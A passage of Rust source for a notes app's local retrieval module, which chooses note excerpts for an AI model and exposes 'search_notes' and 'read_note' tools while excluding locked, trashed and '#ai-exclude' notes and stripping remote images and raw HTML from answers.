//! What a question searches and what it sends: full-text hits and the notes
//! nearest by meaning, scored and merged, with locked notes, the trash and
//! notes tagged `#ai-exclude` left out, and the best passages of what remains.
//!
//! Retrieval is all local. Nothing here calls a model; it chooses the excerpts
//! a question may send and answers the two tools the model can call
//! (`search_notes` and `read_note`) behind the same exclusions.

mod conversation;

pub use conversation::{
    AskedTurn, Conversation, HISTORY_BUDGET, cap_history, eligible_turns, record_turn_notes,
};

use std::collections::{HashMap, HashSet};
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::{Arc, Mutex};

use kanso_ai::{ChatProvider, Event, Excerpt, JsonTool, Prompt, ToolRegistry};
use kanso_core::DocType;
use kanso_core::query::{Clause, Query};
use kanso_store::{MEANING_SIMILARITY, SearchParams};
use kanso_store::{MeaningSearch, Sort, Store};
use serde::Deserialize;

/// How many notes one question may send from the initial retrieval.
pub const MAX_NOTES: usize = 8;
/// The prompt's character budget.
pub const BUDGET: usize = kanso_ai::DEFAULT_BUDGET;

/// How many question words are searched for, and how many hits each gets.
const MAX_TERMS: usize = 8;
/// Each term's full-text hits are fetched by recency (the store's only order),
/// then scored here; this is wide enough for the scorer to choose from.
const TEXT_RESULTS_PER_TERM: usize = 40;
const MEANING_RESULTS: usize = 20;
/// Reciprocal-rank fusion's constant: how quickly lower ranks lose weight.
const RRF_K: f64 = 60.;
/// A passage is at least this long where there is room, and a note gives at
/// most this much unless it is the only one.
const MIN_PER_NOTE: usize = 400;
const MAX_PER_NOTE: usize = 6000;
/// A note that shares no word with the question is sent only when its meaning
/// is a strong match, and then only its opening.
const MEANING_ONLY_SIMILARITY: f32 = 0.5;
const MEANING_ONLY_ROOM: usize = 400;
/// How much of one note a tool result may carry.
const TOOL_EXCERPT_ROOM: usize = 900;
/// How much of one note `read_note` may return.
const READ_ROOM: usize = 6000;
/// How many notes a tool's search may return.
const TOOL_RESULTS: usize = 5;
/// The most text every tool call in one question may hand the model together.
const TOOL_TOTAL_ROOM: usize = 24_000;

/// A note as retrieval sees it. The flags are decided by the store; the
/// exclusions are decided here, in [`eligible`] alone.
#[derive(Clone, Debug, PartialEq)]
pub struct Candidate {
    pub id: String,
    pub title: String,
    pub body: String,
    /// Tag names, as the person writes them.
    pub tags: Vec<String>,
    /// Sealed, or in a locked notebook, even if unlocked right now.
    pub locked: bool,
    pub trashed: bool,
    /// The cosine similarity, when the note came from meaning search and
    /// passed its floor.
    pub meaning: Option<f32>,
}

/// Whether a note may be sent: not locked, not in the trash, and not tagged
/// `#ai-exclude`. This is the one place the exclusions are decided.
pub fn eligible(candidate: &Candidate) -> bool {
    !candidate.locked && !candidate.trashed && !candidate.tags.iter().any(|tag| is_exclude_tag(tag))
}

/// Whether `tag` is the exclusion tag (`#ai-exclude`), however it is
/// written: the same rule the agents' notes server applies.
pub fn is_exclude_tag(tag: &str) -> bool {
    kanso_core::tags::is_ai_exclude(tag)
}

/// The words of a question worth searching for, without the ones every
/// question has. Falls back to the question itself when it is all such words.
pub fn question_terms(question: &str) -> Vec<String> {
    const STOP: &[&str] = &[
        "the",
        "a",
        "an",
        "and",
        "or",
        "but",
        "if",
        "then",
        "than",
        "so",
        "such",
        "what",
        "which",
        "who",
        "whom",
        "whose",
        "how",
        "why",
        "when",
        "where",
        "is",
        "are",
        "was",
        "were",
        "be",
        "been",
        "being",
        "am",
        "do",
        "does",
        "did",
        "of",
        "in",
        "on",
        "at",
        "to",
        "for",
        "from",
        "with",
        "about",
        "into",
        "over",
        "under",
        "again",
        "further",
        "your",
        "you",
        "my",
        "me",
        "i",
        "we",
        "our",
        "it",
        "its",
        "this",
        "that",
        "these",
        "those",
        "can",
        "could",
        "should",
        "would",
        "will",
        "shall",
        "might",
        "must",
        "have",
        "has",
        "had",
        "not",
        "no",
        "as",
        "by",
        "any",
        "all",
        "some",
        "there",
        "their",
        "them",
        "they",
        "he",
        "she",
        "his",
        "her",
        // The verbs and nouns most questions share, which say nothing about
        // which note is relevant.
        "tell",
        "say",
        "says",
        "said",
        "know",
        "remember",
        "recall",
        "write",
        "wrote",
        "written",
        "note",
        "notes",
        "list",
        "last",
        "latest",
        "explain",
        "describe",
        "summarize",
        "summarise",
        "summary",
        "think",
        "mention",
        "mentioned",
        "discuss",
        "discussed",
        "talk",
        "talked",
        "find",
        "show",
        "give",
        "get",
        "want",
        "need",
        "help",
        "please",
        "read",
        "look",
        "see",
        "anything",
        "something",
        "everything",
        "thing",
        "things",
        "according",
        "based",
        "kind",
        "sort",
        "way",
        "much",
        "many",
        "more",
        "most",
        "also",
        "just",
        "only",
        "very",
        "really",
        "like",
        "make",
        "made",
        "take",
        "took",
        "go",
        "went",
        "come",
        "came",
        "keep",
        "kept",
    ];
    let mut seen = HashSet::new();
    let mut terms = Vec::new();
    for word in question.split(|c: char| !c.is_alphanumeric() && c != '\'' && c != '-') {
        let word = word.trim_matches('\'').to_lowercase();
        if word.chars().count() < 3 || STOP.contains(&word.as_str()) || !seen.insert(word.clone()) {
            continue;
        }
        terms.push(word);
        if terms.len() == MAX_TERMS {
            break;
        }
    }
    if terms.is_empty() {
        let whole = question.trim().to_lowercase();
        if !whole.is_empty() {
            terms.push(whole);
        }
    }
    terms
}

/// How many distinct terms a full-text candidate must match: at least half,
/// rounded up, so one incidental word cannot pull in an unrelated note.
pub fn required_matches(terms: usize) -> usize {
    terms.div_ceil(2).max(if terms == 0 { 0 } else { 1 })
}

/// The store's full-text index matches whole tokens, so a question's plural
/// (`plans`) would miss a note's singular (`plan`). Search both forms for each
/// term; the in-memory scorer then decides.
fn search_forms(term: &str) -> Vec<&str> {
    let singular = stem(term);
    if singular == term {
        vec![term]
    } else {
        vec![term, singular]
    }
}

/// Every full-text hit for `terms`, merged by note ID, and how many terms
/// failed outright (every form errored).
fn search_documents(
    store: &Store,
    terms: &[String],
) -> kanso_store::Result<(
    HashMap<String, kanso_store::Doc>,
    usize,
    Option<kanso_store::StoreError>,
)> {
    let mut docs = HashMap::new();
    let mut failed = 0;
    let mut last_error = None;
    for term in terms {
        let mut failed_here = true;
        for word in search_forms(term) {
            let params = SearchParams {
                query: Query {
                    clauses: vec![Clause {
                        negated: false,
                        field: None,
                        value: word.to_owned(),
                    }],
                },
                sort: Sort::UpdatedAt,
                limit: Some(TEXT_RESULTS_PER_TERM),
                ..SearchParams::default()
            };
            match store.search(&params) {
                Ok(found) => {
                    failed_here = false;
                    for doc in found {
                        docs.entry(doc.id.clone()).or_insert(doc);
                    }
                }
                Err(err) => last_error = Some(err),
            }
        }
        if failed_here {
            failed += 1;
        }
    }
    Ok((docs, failed, last_error))
}

/// Merges ranked ID lists by reciprocal-rank fusion: a note high in several
/// lists comes first. `k` is the most returned.
pub fn fuse(ranked: &[Vec<String>], k: usize) -> Vec<String> {
    let mut scores: HashMap<&str, f64> = HashMap::new();
    for list in ranked {
        for (rank, id) in list.iter().enumerate() {
            *scores.entry(id.as_str()).or_default() += 1. / (RRF_K + rank as f64 + 1.);
        }
    }
    let mut merged: Vec<(&str, f64)> = scores.into_iter().collect();
    merged.sort_by(|a, b| b.1.total_cmp(&a.1).then_with(|| a.0.cmp(b.0)));
    merged
        .into_iter()
        .take(k)
        .map(|(id, _)| id.to_owned())
        .collect()
}

/// The notes a question may send, best first. The exclusions are applied
/// here before anything is read out.
pub fn select(
    question: &str,
    candidates: &[Candidate],
    limit: usize,
    budget: usize,
) -> Vec<Excerpt> {
    let allowed: Vec<&Candidate> = candidates
        .iter()
        .filter(|candidate| eligible(candidate))
        .take(limit)
        .collect();
    if allowed.is_empty() || question.trim().is_empty() {
        return Vec::new();
    }
    let terms = question_terms(question);
    let required = required_matches(terms.len());
    let per_note = if allowed.len() == 1 {
        budget
    } else {
        (budget / allowed.len()).clamp(MIN_PER_NOTE, MAX_PER_NOTE)
    };
    let mut used = 0;
    let mut chosen = Vec::new();
    for candidate in allowed {
        let room = per_note.min(budget.saturating_sub(used));
        if room == 0 {
            break;
        }
        let (matched, in_title) = term_hits(&candidate.title, &candidate.body, &terms);
        let from_meaning = candidate
            .meaning
            .is_some_and(|score| score >= MEANING_SIMILARITY);
        if matched < required && !from_meaning {
            continue;
        }
        let mut text = best_text(&candidate.body, &terms, room);
        if text.trim().is_empty() {
            if matched == 0 {
                // No word in the note, title or body, matches the question:
                // only a strong meaning-only hit may send it, and then only
                // its opening, never thousands of characters.
                if !candidate
                    .meaning
                    .is_some_and(|score| score >= MEANING_ONLY_SIMILARITY)
                {
                    continue;
                }
                text = opening(&candidate.body, room.min(MEANING_ONLY_ROOM));
            } else if !from_meaning && in_title == 0 {
                // Nothing in the note's text matches, and its title didn't
                // either: it is not a reason to send the note.
                continue;
            } else {
                text = opening(&candidate.body, room);
            }
        }
        if text.trim().is_empty() {
            continue;
        }
        used += text.chars().count();
        chosen.push(Excerpt {
            id: candidate.id.clone(),
            title: candidate.title.clone(),
            text,
        });
    }
    chosen
}

/// The passages of `body` that match `terms`, joined, within `room`
/// characters. A note with no matching passage gives nothing.
pub fn best_text(body: &str, terms: &[String], room: usize) -> String {
    if body.trim().is_empty() || room == 0 || terms.is_empty() {
        return String::new();
    }
    let passages = passages(body);
    let mut ranked: Vec<(usize, usize)> = passages
        .iter()
        .enumerate()
        .map(|(ix, passage)| (overlap(passage, terms), ix))
        .collect();
    ranked.sort_by(|a, b| b.0.cmp(&a.0).then_with(|| a.1.cmp(&b.1)));
    let mut text = String::new();
    for (score, ix) in ranked {
        if score == 0 {
            break;
        }
        if !text.is_empty() {
            text.push_str("\n\n");
        }
        let left = room.saturating_sub(text.chars().count());
        if left == 0 {
            break;
        }
        let passage = passage_around(&passages[ix], terms, left);
        text.push_str(&passage);
        if text.chars().count() >= room {
            break;
        }
    }
    kanso_ai::prompt::truncate(&text, room)
}

/// The first `room` characters of a note, for a note that passed the meaning
/// floor without sharing a word with the question.
fn opening(body: &str, room: usize) -> String {
    kanso_ai::prompt::truncate(body.trim(), room)
}

/// How many whole-word occurrences of `term` are in `text` (already lowercased),
/// and how many distinct terms appear.
fn overlap(text: &str, terms: &[String]) -> usize {
    let lower = text.to_lowercase();
    terms.iter().map(|term| word_count(&lower, term)).sum()
}

/// How many whole-word occurrences of `term` are in `haystack`.
///
/// Words are compared whole and Unicode-aware, so `plan` does not match
/// `planet` or `planning`. A plain English plural is the same word (`plans`
/// matches `plan`); a term with punctuation or spaces falls back to an exact
/// whole-token substring.
pub fn word_count(haystack: &str, term: &str) -> usize {
    let term = term.trim();
    if term.is_empty() {
        return 0;
    }
    let haystack = haystack.to_lowercase();
    let term = term.to_lowercase();
    if term.chars().any(|c| !c.is_alphanumeric()) {
        return exact_word_count(&haystack, &term);
    }
    let wanted = stem(&term);
    haystack
        .split(|c: char| !c.is_alphanumeric())
        .filter(|word| !word.is_empty() && stem(word) == wanted)
        .count()
}

/// A plain plural's singular. Deliberately tiny: only a trailing `s` on a
/// word of some length, never `ss`.
fn stem(word: &str) -> &str {
    if word.len() > 3 && word.ends_with('s') && !word.ends_with("ss") {
        &word[..word.len() - 1]
    } else {
        word
    }
}

/// Exact whole-token occurrences, for a term that is a phrase or carries
/// punctuation of its own.
fn exact_word_count(haystack: &str, term: &str) -> usize {
    let mut count = 0;
    let mut start = 0;
    while let Some(at) = haystack[start..].find(term) {
        let at = start + at;
        let before = haystack[..at].chars().next_back();
        let after = haystack[at + term.len()..].chars().next();
        if before.is_none_or(|c| !c.is_alphanumeric()) && after.is_none_or(|c| !c.is_alphanumeric())
        {
            count += 1;
        }
        start = at + term.len().max(1);
        if start >= haystack.len() {
            break;
        }
    }
    count
}

/// `(distinct terms matched, distinct terms in the title)` for a note.
fn term_hits(title: &str, body: &str, terms: &[String]) -> (usize, usize) {
    let title = title.to_lowercase();
    let body = body.to_lowercase();
    let mut matched = 0;
    let mut in_title = 0;
    for term in terms {
        let in_body = word_count(&body, term) > 0;
        let in_heading = word_count(&title, term) > 0;
        if in_body || in_heading {
            matched += 1;
        }
        if in_heading {
            in_title += 1;
        }
    }
    (matched, in_title)
}

/// The paragraphs of a body: runs of lines between blank ones.
fn passages(body: &str) -> Vec<String> {
    let mut passages = Vec::new();
    let mut current = String::new();
    for line in body.lines() {
        if line.trim().is_empty() {
            if !current.trim().is_empty() {
                passages.push(current.trim_end().to_owned());
            }
            current.clear();
        } else {
            if !current.is_empty() {
                current.push('\n');
            }
            current.push_str(line);
        }
    }
    if !current.trim().is_empty() {
        passages.push(current.trim_end().to_owned());
    }
    if passages.is_empty() && !body.trim().is_empty() {
        passages.push(body.trim().to_owned());
    }
    passages
}

/// `passage`, or the part of it around the first matching term when it is
/// longer than `room`.
///
/// Matches are found on the original text, char by char, so offsets always
/// land on a character boundary. (Lowercasing can change a string's byte
/// length — `İ` grows, `K` and `ẞ` shrink — so offsets from a lowercased copy
/// must never be used to slice the original.)
fn passage_around(passage: &str, terms: &[String], room: usize) -> String {
    if passage.chars().count() <= room {
        return passage.to_owned();
    }
    let at = terms
        .iter()
        .filter_map(|term| find_term_start(passage, term))
        .min()
        .unwrap_or(0);
    let chars: Vec<char> = passage.chars().collect();
    let at = passage[..at].chars().count();
    let start = at.saturating_sub(room / 4).min(chars.len());
    let end = (start + room).min(chars.len());
    chars[start..end].iter().collect()
}

/// The byte offset of the first whole-word, case-insensitive occurrence of
/// `term` in `haystack`, if any.
fn find_term_start(haystack: &str, term: &str) -> Option<usize> {
    let term = term.to_lowercase();
    if term.is_empty() {
        return None;
    }
    for (start, _) in haystack.char_indices() {
        if haystack[..start]
            .chars()
            .next_back()
            .is_some_and(|c| c.is_alphanumeric())
        {
            continue;
        }
        if let Some(end) = match_at(haystack, start, &term)
            && haystack[end..]
                .chars()
                .next()
                .is_none_or(|c| !c.is_alphanumeric())
        {
            return Some(start);
        }
    }
    None
}

/// The end byte offset when `term` (already lowercased) matches at `start`,
/// comparing each original char's lowercase expansion. Returns `None` when it
/// does not match or runs past the end of `haystack`.
fn match_at(haystack: &str, start: usize, term: &str) -> Option<usize> {
    let mut wanted = term.chars();
    for (offset, ch) in haystack[start..].char_indices() {
        let mut lowered = ch.to_lowercase();
        let mut any = false;
        for lower in lowered.by_ref() {
            if wanted.next()? != lower {
                return None;
            }
            any = true;
        }
        if !any {
            return None;
        }
        if wanted.as_str().is_empty() {
            return Some(start + offset + ch.len_utf8());
        }
    }
    None
}

/// Runs `provider`'s answer to `prompt`, handing each event to `on_event`
/// until the answer ends, fails, or `cancel` is set. `history` is the panel's
/// conversation so far and `tools` are the notes tools the model may call;
/// `on_tool_completed` fires after each call. The iterator is dropped on
/// cancel, which closes the request.
pub fn stream_answer(
    provider: &dyn ChatProvider,
    prompt: &Prompt,
    history: &[kanso_ai::Turn],
    tools: ToolRegistry<()>,
    on_tool_completed: Box<dyn FnMut() + Send>,
    cancel: &Arc<AtomicBool>,
    on_event: impl FnMut(Event),
) {
    if cancel.load(Ordering::Relaxed) {
        return;
    }
    stream_events(
        provider.ask(prompt, history, tools, on_tool_completed, cancel.clone()),
        cancel,
        on_event,
    );
}

/// Hands an answer's events to `on_event` until it ends, fails, or `cancel`
/// is set: a provider's, or an agent conversation's.
pub fn stream_events(
    events: Result<Box<dyn Iterator<Item = Event> + Send>, kanso_ai::AiError>,
    cancel: &Arc<AtomicBool>,
    mut on_event: impl FnMut(Event),
) {
    let events = match events {
        Ok(events) => events,
        Err(err) => {
            on_event(Event::Error(err.to_string()));
            return;
        }
    };
    for event in events {
        if cancel.load(Ordering::Relaxed) {
            return;
        }
        let last = matches!(event, Event::Done | Event::Error(_));
        on_event(event);
        if last {
            return;
        }
    }
}

/// `answer` with each `[[Title]]` that names one of `used` written as a link
/// to that note. A title no excerpt has stays as it was.
pub fn linkify(answer: &str, used: &[Excerpt]) -> String {
    let mut out = String::with_capacity(answer.len());
    let mut rest = answer;
    while let Some(start) = rest.find("[[") {
        out.push_str(&rest[..start]);
        let after = &rest[start + 2..];
        let Some(end) = after.find("]]") else {
            out.push_str(&rest[start..]);
            return out;
        };
        let title = after[..end].trim();
        match used.iter().find(|excerpt| excerpt.title.trim() == title) {
            Some(excerpt) => {
                let id = excerpt.id.strip_prefix("note:").unwrap_or(&excerpt.id);
                out.push_str(&format!(
                    "[{}]({}{id})",
                    title,
                    kanso_core::links::NOTE_LINK_PREFIX
                ));
            }
            None => out.push_str(&rest[start..start + 2 + end + 2]),
        }
        rest = &after[end + 2..];
    }
    out.push_str(rest);
    out
}

/// An answer with remote images removed: rendering an answer must never make
/// Kanso fetch anything. `![alt](https://…)` and protocol-relative images
/// disappear; local images and ordinary links are left as they were.
pub fn strip_remote_images(markdown: &str) -> String {
    let mut out = String::with_capacity(markdown.len());
    let mut cursor = 0;
    while let Some(found) = markdown[cursor..].find("![") {
        let start = cursor + found;
        out.push_str(&markdown[cursor..start]);
        let Some(mid) = markdown[start + 2..].find("](") else {
            out.push_str(&markdown[start..]);
            return out;
        };
        let url_start = start + 2 + mid + 2;
        let Some(close) = markdown[url_start..].find(')') else {
            out.push_str(&markdown[start..]);
            return out;
        };
        let target = markdown[url_start..url_start + close].trim();
        let url = target
            .trim_start_matches('<')
            .split([' ', '\t', '\n'])
            .next()
            .unwrap_or("")
            .trim_end_matches('>');
        let end = url_start + close + 1;
        if is_remote_url(url) {
            cursor = end;
        } else {
            out.push_str(&markdown[start..end]);
            cursor = end;
        }
    }
    out.push_str(&markdown[cursor..]);
    out
}

fn is_remote_url(url: &str) -> bool {
    let lower = url.trim().to_ascii_lowercase();
    lower.starts_with("http://") || lower.starts_with("https://") || lower.starts_with("//")
}

/// The final Markdown for display: citations linked, images removed, and every
/// raw HTML tag neutralised. This is deliberately the last step, after
/// [`linkify`], so a cited note title cannot smuggle `<img>` into the answer.
pub fn sanitize_answer(answer: &str, used: &[Excerpt]) -> String {
    let linked = linkify(answer, used);
    let without_images = strip_remote_images(&linked);
    neutralise_markup(&without_images)
}

/// Escapes every `<` so the Markdown parser can never produce an HTML node,
/// and escapes the `![` opener so no Markdown image node can be produced
/// either. A text answer cannot then make Kanso fetch anything.
fn neutralise_markup(markdown: &str) -> String {
    // Find what the panel's parser would read as HTML or an image, and
    // neutralise only that, so `<` and `![` inside code stay as written.
    // Each pass can expose new constructs (an escaped image becomes a link
    // around text that was its alt), so repeat until nothing is left; if
    // that doesn't settle, fall back to escaping everything.
    let mut text = markdown.to_owned();
    for _ in 0..4 {
        let risky = risky_markup(&text);
        if risky.is_empty() {
            return text;
        }
        for (range, kind) in risky.into_iter().rev() {
            match kind {
                Risky::Html => {
                    let escaped = text[range.clone()].replace('<', "&lt;");
                    text.replace_range(range, &escaped);
                }
                Risky::Image => text.insert(range.start, '\\'),
            }
        }
    }
    escape_all_markup(&text)
}

#[derive(Clone, Copy)]
enum Risky {
    Html,
    Image,
}

/// The byte ranges the panel would render as raw HTML or as an image, in
/// order, without overlaps. The panel parses with GFM plus math; math it
/// doesn't claim is parsed again as prose, so the text is also read with
/// math off and both sets are kept.
fn risky_markup(text: &str) -> Vec<(std::ops::Range<usize>, Risky)> {
    fn walk(node: &markdown::mdast::Node, out: &mut Vec<(std::ops::Range<usize>, Risky)>) {
        use markdown::mdast::Node;
        let kind = match node {
            Node::Html(_) => Some(Risky::Html),
            Node::Image(_) | Node::ImageReference(_) => Some(Risky::Image),
            _ => None,
        };
        if let (Some(kind), Some(at)) = (kind, node.position()) {
            out.push((at.start.offset..at.end.offset, kind));
            return;
        }
        if let Some(children) = node.children() {
            for child in children {
                walk(child, out);
            }
        }
    }
    let mut with_math = markdown::ParseOptions::gfm();
    with_math.constructs.math_text = true;
    with_math.constructs.math_flow = true;
    let mut found = Vec::new();
    for options in [with_math, markdown::ParseOptions::gfm()] {
        match markdown::to_mdast(text, &options) {
            Ok(root) => walk(&root, &mut found),
            // Unparseable: treat the whole text as risky.
            Err(_) => found.push((0..text.len(), Risky::Html)),
        }
    }
    found.sort_by_key(|(range, _)| (range.start, std::cmp::Reverse(range.end)));
    let mut merged: Vec<(std::ops::Range<usize>, Risky)> = Vec::new();
    for (range, kind) in found {
        match merged.last_mut() {
            Some((last, last_kind)) if range.start < last.end => {
                // Overlapping finds: one HTML escape over both covers it.
                last.end = last.end.max(range.end);
                *last_kind = Risky::Html;
            }
            _ => merged.push((range, kind)),
        }
    }
    merged
}

/// Escapes every `<` and `![`: the fallback when parsing doesn't settle.
fn escape_all_markup(markdown: &str) -> String {
    let mut out = String::with_capacity(markdown.len());
    let mut chars = markdown.chars().peekable();
    while let Some(ch) = chars.next() {
        match ch {
            '<' => out.push_str("&lt;"),
            '!' if chars.peek() == Some(&'[') => {
                out.push_str("!\\[");
                chars.next();
            }
            other => out.push(other),
        }
    }
    out
}

/// The tag names by ID, for deciding `#ai-exclude` from a note's tag IDs.
fn tag_names(store: &Store) -> kanso_store::Result<HashMap<String, String>> {
    Ok(store
        .tags()?
        .into_iter()
        .map(|tag| (tag.id, tag.name))
        .collect())
}

fn tags_of(note: &kanso_core::Note, names: &HashMap<String, String>) -> Vec<String> {
    note.tags
        .iter()
        .map(|id| names.get(id).cloned().unwrap_or_else(|| id.clone()))
        .collect()
}

/// One candidate from a note, after every exclusion, or `None` when it may
/// not be read or sent.
fn candidate_for(
    store: &Store,
    id: &str,
    names: &HashMap<String, String>,
    meaning: Option<f32>,
) -> kanso_store::Result<Option<Candidate>> {
    // Fail closed: an unchecked lock is treated as locked.
    if store.note_is_locked(id).unwrap_or(true) {
        return Ok(None);
    }
    let Some(note) = store.note(id)? else {
        return Ok(None);
    };
    let tags = tags_of(&note, names);
    let candidate = Candidate {
        id: note.id.clone(),
        title: note.title.clone(),
        body: note.body.clone(),
        tags,
        locked: false,
        trashed: note.is_trashed(),
        meaning,
    };
    Ok(eligible(&candidate).then_some(candidate))
}

/// Whether note `id` may still be sent: the same [`eligible`] decision used by
/// retrieval, checked against the store. Any error counts as not eligible, so
/// a follow-up history fails closed.
pub fn note_is_eligible(store: &Store, id: &str) -> bool {
    let id = if id.trim().starts_with("note:") {
        id.trim().to_owned()
    } else {
        format!("note:{}", id.trim())
    };
    let Ok(names) = tag_names(store) else {
        return false;
    };
    matches!(candidate_for(store, &id, &names, None), Ok(Some(_)))
}

/// Note `id` as something that may be sent, or `None` when it is missing,
/// locked (even if this session unlocked it), in the trash or tagged
/// `#ai-exclude`. The inline assistant and the summary read their note
/// through this, so they keep out what Ask keeps out.
pub fn eligible_note(store: &Store, id: &str) -> kanso_store::Result<Option<Candidate>> {
    let id = if id.trim().starts_with("note:") {
        id.trim().to_owned()
    } else {
        format!("note:{}", id.trim())
    };
    let names = tag_names(store)?;
    candidate_for(store, &id, &names, None)
}

/// Searches `store` for `question` and returns the excerpts to send, or
/// nothing when the notes don't cover it.
pub fn retrieve(store: &Store, question: &str) -> kanso_store::Result<Vec<Excerpt>> {
    let question = question.trim();
    let terms = question_terms(question);
    if terms.is_empty() || question.is_empty() {
        return Ok(Vec::new());
    }
    let names = tag_names(store)?;
    let required = required_matches(terms.len());

    let (docs, failed, last_error) = search_documents(store, &terms)?;
    // Every full-text search failing is a real search error; one failing term
    // is not.
    if failed == terms.len() {
        return Err(last_error.expect("a failed search has an error"));
    }

    let mut text_ranked: Vec<(String, f64, i64)> = Vec::new();
    for (id, doc) in &docs {
        if doc.doc_type != DocType::Note {
            continue;
        }
        // Run the one eligibility predicate before using a search hit's
        // title or body. The final pass checks it again before sending.
        let Some(candidate) = candidate_for(store, id, &names, None)? else {
            continue;
        };
        let (matched, in_title) =
            term_hits(&candidate.title, &candidate.body.to_lowercase(), &terms);
        if matched < required {
            continue;
        }
        let occurrences: usize = terms
            .iter()
            .map(|term| word_count(&candidate.body, term))
            .sum();
        let score =
            matched as f64 * 10. + in_title as f64 * 8. + (occurrences.min(12) as f64) * 0.5;
        let updated = doc
            .fields
            .get("updatedAt")
            .and_then(|value| value.as_i64())
            .unwrap_or(0);
        text_ranked.push((id.clone(), score, updated));
    }
    text_ranked.sort_by(|a, b| {
        b.1.total_cmp(&a.1)
            .then_with(|| b.2.cmp(&a.2))
            .then_with(|| a.0.cmp(&b.0))
    });
    let text_ids: Vec<String> = text_ranked.into_iter().map(|(id, _, _)| id).collect();

    // Meaning search is best effort: no model, or an error, leaves the
    // full-text results alone.
    let mut meaning_scores: HashMap<String, f32> = HashMap::new();
    let mut meaning_ids = Vec::new();
    if let Ok(MeaningSearch::Found(found)) = store.search_by_meaning(question, MEANING_RESULTS) {
        for note in found {
            if note.score >= MEANING_SIMILARITY
                && candidate_for(store, &note.id, &names, Some(note.score))?.is_some()
            {
                meaning_scores.insert(note.id.clone(), note.score);
                meaning_ids.push(note.id);
            }
        }
    }

    let mut lists = vec![text_ids];
    if !meaning_ids.is_empty() {
        lists.push(meaning_ids);
    }
    let ranked = fuse(&lists, MAX_NOTES * 4);
    let mut candidates = Vec::new();
    for id in ranked {
        let meaning = meaning_scores.get(&id).copied();
        // Every candidate goes through `candidate_for`, which re-checks the
        // note (including a lock check that fails closed). Building one from a
        // search row here would skip that check.
        if let Some(candidate) = candidate_for(store, &id, &names, meaning)? {
            candidates.push(candidate);
        }
    }
    Ok(select(question, &candidates, MAX_NOTES, BUDGET))
}

/// The notes a tool search returns, with the passages that matched. Every
/// exclusion applies exactly as it does to the initial retrieval.
pub fn search_notes(
    store: &Store,
    query: &str,
    used: &Mutex<Vec<Excerpt>>,
) -> kanso_store::Result<Vec<Excerpt>> {
    let terms = question_terms(query);
    if terms.is_empty() {
        return Ok(Vec::new());
    }
    let names = tag_names(store)?;
    let (docs, failed, last_error) = search_documents(store, &terms)?;
    if failed == terms.len() {
        return Err(last_error.expect("a failed search has an error"));
    }

    let mut scored: Vec<(String, usize, i64)> = Vec::new();
    for (id, doc) in &docs {
        if doc.doc_type != DocType::Note {
            continue;
        }
        // Both the selection pass and the pass that reads an excerpt use the
        // same store-backed eligibility gate.
        let Some(candidate) = candidate_for(store, id, &names, None)? else {
            continue;
        };
        let (matched, in_title) =
            term_hits(&candidate.title, &candidate.body.to_lowercase(), &terms);
        if matched == 0 {
            continue;
        }
        let updated = doc
            .fields
            .get("updatedAt")
            .and_then(|value| value.as_i64())
            .unwrap_or(0);
        scored.push((id.clone(), matched * 10 + in_title * 8, updated));
    }
    scored.sort_by(|a, b| {
        b.1.cmp(&a.1)
            .then_with(|| b.2.cmp(&a.2))
            .then_with(|| a.0.cmp(&b.0))
    });

    let mut results = Vec::new();
    for (id, _, _) in scored.into_iter().take(TOOL_RESULTS) {
        let Some(candidate) = candidate_for(store, &id, &names, None)? else {
            continue;
        };
        let text = best_text(&candidate.body, &terms, TOOL_EXCERPT_ROOM);
        let excerpt = Excerpt {
            id: id.clone(),
            title: candidate.title,
            text,
        };
        record_used(used, &excerpt);
        results.push(excerpt);
    }
    Ok(results)
}

/// One note by ID for the `read_note` tool, or `None` when it is missing or
/// excluded (so an excluded note is indistinguishable from a missing one).
pub fn read_note(
    store: &Store,
    id: &str,
    used: &Mutex<Vec<Excerpt>>,
) -> kanso_store::Result<Option<Excerpt>> {
    let id = if id.trim().starts_with("note:") {
        id.trim().to_owned()
    } else {
        format!("note:{}", id.trim())
    };
    let names = tag_names(store)?;
    let Some(candidate) = candidate_for(store, &id, &names, None)? else {
        return Ok(None);
    };
    let excerpt = Excerpt {
        id: candidate.id,
        title: candidate.title,
        text: kanso_ai::prompt::truncate(candidate.body.trim(), READ_ROOM),
    };
    record_used(used, &excerpt);
    Ok(Some(excerpt))
}

/// Trims tool text to what is left of this question's tool budget. Titles and
/// IDs always stay so the model can still name a note it saw.
fn clamp_excerpts(results: Vec<Excerpt>, room: &Mutex<usize>) -> Vec<Excerpt> {
    let mut left = room.lock().unwrap_or_else(|poisoned| poisoned.into_inner());
    results
        .into_iter()
        .map(|mut excerpt| {
            let take = (*left).min(excerpt.text.chars().count());
            excerpt.text = kanso_ai::prompt::truncate(&excerpt.text, take);
            *left -= take;
            excerpt
        })
        .collect()
}

fn record_used(used: &Mutex<Vec<Excerpt>>, excerpt: &Excerpt) {
    if let Ok(mut used) = used.lock()
        && !used.iter().any(|seen| seen.id == excerpt.id)
    {
        used.push(excerpt.clone());
    }
}

#[derive(Deserialize, schemars::JsonSchema)]
struct SearchArgs {
    /// The words to find in the notes.
    query: String,
}

#[derive(Deserialize, schemars::JsonSchema)]
struct ReadArgs {
    /// The note's ID, as given by search_notes or an excerpt label.
    id: String,
}

/// The two tools a question may call. Both enforce the same exclusions as
/// retrieval, and both add what they read to `used`, so the panel can show
/// every note the answer drew on.
pub fn tool_registry(store: Arc<Store>, used: Arc<Mutex<Vec<Excerpt>>>) -> ToolRegistry<()> {
    let mut registry = ToolRegistry::new();
    // One budget for everything the tools hand the model this question, so a
    // model that keeps calling search cannot grow the request without bound.
    let room = Arc::new(Mutex::new(TOOL_TOTAL_ROOM));
    let search_store = store.clone();
    let search_used = used.clone();
    let search_room = room.clone();
    registry.register(JsonTool::new(
        "search_notes",
        "Search the user's notes. Returns matching notes with their IDs and the passages that matched.",
        move |_ctx: (), args: SearchArgs| {
            let store = search_store.clone();
            let used = search_used.clone();
            let room = search_room.clone();
            async move {
                match search_notes(&store, &args.query, &used) {
                    Ok(results) => {
                        let results = clamp_excerpts(results, &room);
                        Ok(serde_json::json!({
                            "results": results
                                .into_iter()
                                .map(|excerpt| serde_json::json!({
                                    "id": excerpt.id,
                                    "title": excerpt.title,
                                    "excerpt": excerpt.text,
                                }))
                                .collect::<Vec<_>>(),
                        }))
                    }
                    Err(_) => Ok(serde_json::json!({
                        "error": "Couldn't search the notes.",
                    })),
                }
            }
        },
    ));
    let read_store = store;
    let read_used = used;
    let read_room = room;
    registry.register(JsonTool::new(
        "read_note",
        "Read one note by ID. A note that is locked, in the trash or tagged #ai-exclude is reported as not found.",
